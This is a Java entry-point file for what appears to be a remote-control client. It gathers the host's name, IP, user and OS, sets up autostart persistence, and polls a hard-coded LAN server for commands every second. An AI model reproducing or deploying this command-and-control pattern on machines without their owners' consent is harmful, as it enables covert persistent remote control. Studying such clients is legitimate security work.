package ch.lebois.client;

import ch.lebois.client.configure.Autostart;
import ch.lebois.client.configure.ClientConfigure;
import ch.lebois.client.handler.CommandReader;

public class ClientApplication {

    public static void main(String[] args) {
        ClientConfigure clientConfigure = new ClientConfigure();
        clientConfigure.setPcName();
        clientConfigure.setServer("http://192.168.100.153:8080");
        clientConfigure.setArch("1.0");
        clientConfigure.setIp();
        clientConfigure.setPcUser();
        clientConfigure.setOs();

        new Autostart().decide();

        while (true) {
            CommandReader.read();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
